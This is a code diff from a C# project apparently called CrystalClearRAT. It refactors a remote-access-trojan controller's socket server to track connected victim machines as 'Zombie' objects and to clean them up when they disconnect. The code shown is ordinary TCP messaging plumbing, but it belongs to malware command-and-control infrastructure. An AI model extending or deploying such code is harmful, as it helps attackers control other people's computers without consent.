@@ -29,19 +29,19 @@ namespace CrystalClearRAT.Web
             ServerSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
         }
 
-        public static void Send(byte[] data, Socket client)
+        public static void Send(byte[] data, Zombie zombie)
         {
             byte[] dataLength = BitConverter.GetBytes(data.Length);
 
 
-            client.BeginSend(dataLength, 0, dataLength.Length, 0, new AsyncCallback(SendCallback), new StateObject(client, data));
+            zombie.Socket.BeginSend(dataLength, 0, dataLength.Length, 0, new AsyncCallback(SendCallback), new StateObject(zombie, data));
         }
 
         private static void SendCallback(IAsyncResult ar)
         {
             StateObject state = (StateObject)ar.AsyncState;
-            state.Socket.EndSend(ar);
-            state.Socket.Send(state.Buffer);
+            state.Zombie.Socket.EndSend(ar);
+            state.Zombie.Socket.Send(state.Buffer);
 
         }
 
@@ -51,22 +51,36 @@ namespace CrystalClearRAT.Web
 
             IPEndPoint acceptedEndPoint = (IPEndPoint)accepted.RemoteEndPoint;
 
-            new Zombie(acceptedEndPoint.Address.ToString(), acceptedEndPoint.Port, accepted);
+            Zombie zombie;
 
-            Receive(accepted);
+            zombie = new Zombie(acceptedEndPoint.Address.ToString(), acceptedEndPoint.Port, accepted);
+
+            Receive(zombie);
 
             ServerSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
 
         }
 
-      
 
-        private static void Receive(Socket fromSocket)
+
+        private static void Receive(Zombie zombie)
         {
             byte bufLength = 4;
             byte[] buffer = new byte[bufLength];
 
-            fromSocket.BeginReceive(buffer, 0, bufLength, 0, new AsyncCallback(ReceiveCallback), new StateObject(fromSocket, buffer));
+            try
+            {
+                zombie.Socket.BeginReceive(buffer, 0, bufLength, 0, new AsyncCallback(ReceiveCallback), new StateObject(zombie, buffer));
+            }
+            catch (SocketException)
+            {
+                Console.WriteLine("Zombie disconnected. Cleaning up.");
+                zombie.Destroy();
+
+            }
+
+
+
         }
 
         private static void ReceiveCallback(IAsyncResult ar)
@@ -74,7 +88,19 @@ namespace CrystalClearRAT.Web
             // TODO: ERROR CONTROL AND OPERATION TIMEOUT.
 
             StateObject state = (StateObject)ar.AsyncState;
-            state.Socket.EndReceive(ar);
+
+            try
+            {
+                state.Zombie.Socket.EndReceive(ar);
+            }
+
+            catch (SocketException)
+            {
+                Console.WriteLine("Zombie disconnected. Cleaning up.");
+                state.Zombie.Destroy();
+                return;
+
+            }
 
             int bufSize = BitConverter.ToInt32(state.Buffer, 0);
             byte[] buffer;
@@ -82,17 +108,17 @@ namespace CrystalClearRAT.Web
 
             while (bufSize > 0)
             {
-                if (bufSize < state.Socket.ReceiveBufferSize)
+                if (bufSize < state.Zombie.Socket.ReceiveBufferSize)
                 {
                     buffer = new byte[bufSize];
                 }
 
                 else
                 {
-                    buffer = new byte[state.Socket.ReceiveBufferSize];
+                    buffer = new byte[state.Zombie.Socket.ReceiveBufferSize];
                 }
 
-                int rec = state.Socket.Receive(buffer, 0, buffer.Length, 0);
+                int rec = state.Zombie.Socket.Receive(buffer, 0, buffer.Length, 0);
                 bufSize -= rec;
 
                 ms.Write(buffer, 0, buffer.Length);
@@ -107,7 +133,8 @@ namespace CrystalClearRAT.Web
 
             System.Windows.MessageBox.Show((System.Text.Encoding.UTF8.GetString(data)));
 
-            Receive(state.Socket);
+            Receive(state.Zombie);
+
 
 
         }
